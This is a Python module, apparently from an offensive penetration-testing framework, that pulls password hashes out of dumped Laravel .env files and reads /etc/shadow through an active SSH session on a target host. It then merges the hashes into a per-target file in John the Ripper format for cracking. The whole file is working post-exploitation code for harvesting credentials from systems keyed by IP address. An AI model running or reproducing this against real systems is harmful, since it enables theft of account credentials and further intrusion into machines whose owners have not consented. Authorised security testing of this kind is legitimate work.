"""Extract password hashes from Laravel .env dumps and /etc/shadow via SSH."""

import os
import re

from engines.utils import log, get_target_dir

# bcrypt, sha512/sha256/md5 crypt, LDAP-style
_HASH_PATTERNS = [
    re.compile(r"\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}"),
    re.compile(r"\$6\$[^:$]{1,16}\$[./A-Za-z0-9]{43}"),
    re.compile(r"\$5\$[^:$]{1,16}\$[./A-Za-z0-9]{43}"),
    re.compile(r"\$1\$[^:$]{1,16}\$[./A-Za-z0-9]{22}"),
    re.compile(r"\{MD5\}[+/A-Za-z0-9=]+", re.I),
    re.compile(r"\{SSHA\}[+/A-Za-z0-9=]+", re.I),
]


def _looks_like_hash(value: str) -> bool:
    value = value.strip().strip('"').strip("'")
    if not value or len(value) < 20:
        return False
    if value in ("null", "NULL", "None", ""):
        return False
    return any(p.search(value) for p in _HASH_PATTERNS) or (
        value.startswith("$") and len(value) >= 34
    )


def extract_hashes_from_text(text: str) -> list[str]:
    """Pull hash strings from arbitrary text (shadow, .env, config dumps)."""
    found: set[str] = set()

    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        # /etc/shadow: user:$6$salt$hash:...
        if ":" in line and "$" in line.split(":", 1)[-1]:
            parts = line.split(":")
            if len(parts) >= 2:
                candidate = parts[1].strip()
                if candidate and candidate not in ("*", "!", "x") and _looks_like_hash(candidate):
                    found.add(candidate)

        # KEY=hash or inline hash in .env / configs
        if "=" in line and not line.startswith("$"):
            _, _, val = line.partition("=")
            val = val.strip().strip('"').strip("'")
            if _looks_like_hash(val):
                found.add(val)

        for pat in _HASH_PATTERNS:
            for match in pat.finditer(line):
                found.add(match.group())

    return sorted(found)


def extract_from_env_file(env_path: str) -> list[str]:
    if not os.path.isfile(env_path):
        return []
    try:
        with open(env_path, encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except OSError as exc:
        log(f"Cannot read env file {env_path}: {exc}", "ERROR")
        return []

    hashes = extract_hashes_from_text(content)
    if hashes:
        log(f"Extracted {len(hashes)} hash(es) from Laravel .env dump.", "SUCCESS")
    return hashes


def extract_shadow_via_ssh(ssh_client) -> list[str]:
    """Read /etc/shadow through an active SSH session."""
    try:
        _, stdout, stderr = ssh_client.exec_command("cat /etc/shadow 2>/dev/null", timeout=15)
        shadow = stdout.read().decode(errors="ignore")
        err = stderr.read().decode(errors="ignore").strip()
        if not shadow.strip():
            if err:
                log(f"Shadow read failed (need root): {err[:120]}", "WARNING")
            return []
        hashes = extract_hashes_from_text(shadow)
        if hashes:
            log(f"Extracted {len(hashes)} hash(es) from /etc/shadow via SSH.", "SUCCESS")
        return hashes
    except Exception as exc:
        log(f"SSH shadow extraction error: {exc}", "ERROR")
        return []


def write_hashes_file(ip: str, hashes: list[str]) -> str | None:
    """Merge hashes into targets/{ip}/hashes.txt (John the Ripper format)."""
    if not hashes:
        return None

    path = os.path.join(get_target_dir(ip), "hashes.txt")
    existing: set[str] = set()
    if os.path.isfile(path):
        with open(path, encoding="utf-8", errors="ignore") as f:
            existing = {ln.strip() for ln in f if ln.strip()}

    merged = sorted(existing | set(hashes))
    with open(path, "w", encoding="utf-8") as f:
        for h in merged:
            f.write(h + "\n")

    log(f"Hash file updated: {path} ({len(merged)} total)", "SUCCESS")
    return path
